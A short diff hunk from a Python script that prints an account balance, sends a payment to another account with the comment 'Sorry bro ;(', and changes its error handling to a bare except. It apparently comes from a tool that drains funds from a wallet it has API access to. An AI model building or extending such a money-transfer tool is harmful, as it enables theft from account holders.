@@ -14,6 +14,6 @@ def viv():
 		print(G+"[+]"+W+" Balance = ", api.balance)
 		api.pay(account=pho2, amount=amou, comment="Sorry bro ;(")
 		print(G+"[+]"+W+" Balance = ", api.balance)
-	except OSError:
+	except:
 		print(R+"[-]"+W+" Something wrong!")
 		pass
